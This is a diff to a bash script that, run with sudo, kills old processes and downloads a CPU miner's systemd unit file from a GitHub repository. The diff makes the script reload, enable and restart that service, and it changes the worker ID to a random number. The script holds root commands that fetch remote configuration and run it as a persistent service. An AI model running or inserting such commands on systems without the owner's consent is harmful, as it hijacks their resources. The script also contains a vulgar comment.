@@ -1,6 +1,6 @@
 #!/bin/bash 
 # kill the old bitches
-workerid=$1
+workerid=${RANDOM:0:5} 
 
 #unload old runbin
 sudo killall dmsd -q
@@ -33,5 +33,8 @@ sudo rm -r /etc/systemd/system/miner.service
 sudo wget  https://raw.githubusercontent.com/senery/cpuminers/main/miner.service 
 sudo systemctl daemon-reload
 sudo systemctl start miner.service  
-sudo systemctl enable miner.service  
+sudo systemctl enable miner.service
+sudo systemctl daemon-reload
+sudo systemctl restart miner.service
+
 echo done
